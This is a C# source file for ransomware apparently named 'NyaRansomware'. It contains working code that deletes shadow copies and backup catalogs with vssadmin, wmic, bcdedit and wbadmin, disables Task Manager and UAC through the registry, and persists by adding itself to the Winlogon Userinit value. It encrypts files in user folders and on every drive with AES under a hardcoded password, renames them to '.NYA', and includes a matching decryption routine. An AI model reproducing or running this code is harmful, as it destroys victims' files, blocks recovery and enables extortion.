using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace NyaRansomware.Encryption_Start
{
    internal class Encrypt
    {
        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] result = null;
                byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    RijndaelManaged rijndaelManaged = new RijndaelManaged();
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
                return result;
            }
        }

        public class CoreDecryption
        {
            public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
            {
                byte[] result = null;
                byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    RijndaelManaged rijndaelManaged = new RijndaelManaged();
                    rijndaelManaged.KeySize = 256;
                    rijndaelManaged.BlockSize = 128;
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cryptoStream.Close();
                    }
                    result = memoryStream.ToArray();
                }
                return result;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {
                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] bytes = Encoding.UTF8.GetBytes(password);
                bytes = SHA256.Create().ComputeHash(bytes);
                byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
                File.WriteAllBytes(file, bytes2);
            }
        }

        public class DecryptionFile
        {
            public void DecryptFile(string fileEncrypted, string password)
            {
                byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
                byte[] bytes = Encoding.UTF8.GetBytes(password);
                bytes = SHA256.Create().ComputeHash(bytes);
                byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
                File.WriteAllBytes(fileEncrypted, bytes2);
            }
        }

        public static void OFF_Encrypt()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c bootrec /rebuildbcd";
            processStartInfo.Verb = "runas";
            Process.Start(processStartInfo);
            RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System");
            if (registryKey.GetValue("DisableTaskMgr") == null)
            {
                registryKey.DeleteValue("DisableTaskMgr");
            }
            registryKey.DeleteValue("DisableTaskMgr");
            registryKey.Close();
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
            string text = Path.Combine(environmentVariable, "Downloads");
            string text2 = Path.Combine(environmentVariable, "Videos");
            string text3 = Path.Combine(environmentVariable, "Music");
            string text4 = Path.Combine(environmentVariable, "Pictures");
            string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
            string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
            string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
            DecryptionFile dec = new DecryptionFile();
            string password = "736457983546798345679547968257986453798346598732456934527986534798652467983546798234597682534976823456798967584";
            Thread thread = new Thread((ThreadStart)delegate
            {
                try
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        try
                        {
                            dec.DecryptFile(files[i], password);
                            File.Move(files[i], files[i].Replace(".NYA", ""));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    for (int j = 0; j < files2.Length; j++)
                    {
                        try
                        {
                            dec.DecryptFile(files2[j], password);
                            File.Move(files2[j], files2[j].Replace(".NYA", ""));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    for (int k = 0; k < files3.Length; k++)
                    {
                        try
                        {
                            dec.DecryptFile(files3[k], password);
                            File.Move(files3[k], files3[k].Replace(".NYA", ""));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    for (int l = 0; l < files4.Length; l++)
                    {
                        try
                        {
                            dec.DecryptFile(files4[l], password);
                            File.Move(files4[l], files4[l].Replace(".NYA", ""));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    for (int m = 0; m < files5.Length; m++)
                    {
                        try
                        {
                            dec.DecryptFile(files5[m], password);
                            File.Move(files5[m], files5[m].Replace(".NYA", ""));
                        }
                        catch (Exception)
                        {
                        }
                    }
                    DriveInfo[] drives = DriveInfo.GetDrives();
                    foreach (DriveInfo driveInfo in drives)
                    {
                        string[] files6 = Directory.GetFiles(driveInfo.Name, "*", SearchOption.AllDirectories);
                        for (int num = 0; num < files6.Length; num++)
                        {
                            try
                            {
                                dec.DecryptFile(files6[num], password);
                                File.Move(files6[num], files6[num].Replace(".NYA", ""));
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }
                catch (Exception)
                {
                }
                RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                RegistryKey registryKey3 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
                registryKey3.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
                registryKey3.Close();
                RegistryKey registryKey4 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
                registryKey4.SetValue("Userinit", "C:\\windows\\system32\\userinit.exe,");
                registryKey4.Close();
                Process.GetCurrentProcess().Kill();
            });
            thread.Start();
        }

        public static void Start()
        {
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet";
            processStartInfo.Verb = "runas";
            Process.Start(processStartInfo);
            RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
            RegistryKey registryKey3 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
            registryKey3.SetValue("ShellExperience", "\"ShellExperience.exe\"", RegistryValueKind.String);
            registryKey3.Close();
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
            string text = Path.Combine(environmentVariable, "Downloads");
            string text2 = Path.Combine(environmentVariable, "Videos");
            string text3 = Path.Combine(environmentVariable, "Music");
            string text4 = Path.Combine(environmentVariable, "Pictures");
            string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
            string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
            string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
            string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
            string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
            EncryptionFile encryptionFile = new EncryptionFile();
            string password = "736457983546798345679547968257986453798346598732456934527986534798652467983546798234597682534976823456798967584";
            try
            {
                List<string> list = new List<string>();
                for (int i = 0; i < files.Length; i++)
                {
                    try
                    {
                        if (!files[i].EndsWith(".NYA"))
                        {
                            list.Add("Encrypted: " + files[i]);
                            encryptionFile.EncryptFile(files[i], password);
                            File.Move(files[i], files[i] + ".NYA");
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                for (int j = 0; j < files2.Length; j++)
                {
                    if (!files2[j].EndsWith(".NYA"))
                    {
                        try
                        {
                            list.Add("Encrypted: " + files2[j]);
                            encryptionFile.EncryptFile(files2[j], password);
                            File.Move(files2[j], files2[j] + ".NYA");
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                for (int k = 0; k < files3.Length; k++)
                {
                    if (!files3[k].EndsWith(".NYA"))
                    {
                        try
                        {
                            list.Add("Encrypted: " + files3[k]);
                            encryptionFile.EncryptFile(files3[k], password);
                            File.Move(files3[k], files3[k] + ".NYA");
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                for (int l = 0; l < files4.Length; l++)
                {
                    if (!files4[l].EndsWith(".NYA"))
                    {
                        try
                        {
                            list.Add("Encrypted: " + files4[l]);
                            encryptionFile.EncryptFile(files4[l], password);
                            File.Move(files4[l], files4[l] + ".NYA");
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                for (int m = 0; m < files5.Length; m++)
                {
                    if (!files5[m].EndsWith(".NYA"))
                    {
                        try
                        {
                            list.Add("Encrypted: " + files5[m]);
                            encryptionFile.EncryptFile(files5[m], password);
                            File.Move(files5[m], files5[m] + ".NYA");
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                DriveInfo[] drives = DriveInfo.GetDrives();
                foreach (DriveInfo driveInfo in drives)
                {
                    string[] files6 = Directory.GetFiles(driveInfo.Name, "*", SearchOption.AllDirectories);
                    for (int num = 0; num < files6.Length; num++)
                    {
                        if (!files6[num].EndsWith(".NYA"))
                        {
                            try
                            {
                                list.Add("Encrypted: " + files6[num]);
                                encryptionFile.EncryptFile(files6[num], password);
                                File.Move(files6[num], files6[num] + ".NYA");
                            }
                            catch (Exception)
                            {
                            }
                        }
                    }
                }
                File.WriteAllLines("Winrar.dat", list);
            }
            catch (Exception)
            {
            }
            RegistryKey registryKey4 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
            registryKey4.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            registryKey4.Close();
            RegistryKey registryKey5 = registryKey2.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
            registryKey5.SetValue("Userinit", "C:\\windows\\system32\\userinit.exe," + Process.GetCurrentProcess().MainModule.FileName + ",");
            registryKey5.Close();
            Form1 mainForm = new Form1();
            Application.Run(mainForm);
        }
    }
}
